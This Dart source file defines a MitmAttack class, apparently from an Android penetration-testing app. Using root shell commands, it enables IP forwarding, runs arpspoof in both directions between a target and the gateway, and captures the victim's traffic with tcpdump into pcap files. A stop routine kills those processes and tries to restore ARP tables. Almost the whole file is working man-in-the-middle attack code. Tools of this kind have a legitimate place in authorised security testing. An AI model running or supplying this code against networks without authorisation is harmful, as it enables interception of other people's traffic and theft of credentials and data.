import '../core/shell_executor.dart';

class MitmAttack {
  final ShellExecutor _shell = ShellExecutor.instance;
  bool _isActive = false;
  String? _targetIp;
  String? _gatewayIp;
  String? _interface;

  Future<void> startAttack(String targetIp, String gatewayIp, String interface) async {
    if (_isActive) {
      throw Exception('MITM attack is already active');
    }

    try {
      _targetIp = targetIp;
      _gatewayIp = gatewayIp;
      _interface = interface;

      // Enable IP forwarding
      await _shell.executeCommand(
        'echo 1 > /proc/sys/net/ipv4/ip_forward',
        requireRoot: true,
      );

      // Start ARP spoofing for target
      await _shell.executeCommand(
        'arpspoof -i $interface -t $targetIp $gatewayIp &',
        requireRoot: true,
      );

      // Start ARP spoofing for gateway
      await _shell.executeCommand(
        'arpspoof -i $interface -t $gatewayIp $targetIp &',
        requireRoot: true,
      );

      // Start packet capture
      await _shell.executeCommand(
        'tcpdump -i $interface -w /data/data/com.wimax.pentest/files/captures/mitm_${DateTime.now().millisecondsSinceEpoch}.pcap &',
        requireRoot: true,
      );

      _isActive = true;
    } catch (e) {
      throw Exception('Failed to start MITM attack: $e');
    }
  }

  Future<void> stopAttack() async {
    if (!_isActive) {
      throw Exception('No MITM attack is currently active');
    }

    try {
      // Kill arpspoof processes
      await _shell.executeCommand('killall arpspoof', requireRoot: true);
      
      // Kill tcpdump processes
      await _shell.executeCommand('killall tcpdump', requireRoot: true);

      // Disable IP forwarding
      await _shell.executeCommand(
        'echo 0 > /proc/sys/net/ipv4/ip_forward',
        requireRoot: true,
      );

      // Restore ARP tables
      if (_targetIp != null && _gatewayIp != null && _interface != null) {
        await _restoreArpTables();
      }

      _isActive = false;
      _targetIp = null;
      _gatewayIp = null;
      _interface = null;
    } catch (e) {
      throw Exception('Failed to stop MITM attack: $e');
    }
  }

  Future<void> _restoreArpTables() async {
    try {
      // Get real MAC addresses
      final targetMacResult = await _shell.executeCommand('arp -n $_targetIp');
      final gatewayMacResult = await _shell.executeCommand('arp -n $_gatewayIp');

      // Send correct ARP responses to restore tables
      if (targetMacResult.exitCode == 0 && gatewayMacResult.exitCode == 0) {
        await _shell.executeCommand(
          'arping -c 3 -I $_interface $_targetIp',
          requireRoot: true,
        );
        await _shell.executeCommand(
          'arping -c 3 -I $_interface $_gatewayIp',
          requireRoot: true,
        );
      }
    } catch (e) {
      // Log error but don't throw - restoration is best effort
    }
  }

  bool get isActive => _isActive;
  String? get targetIp => _targetIp;
  String? get gatewayIp => _gatewayIp;
}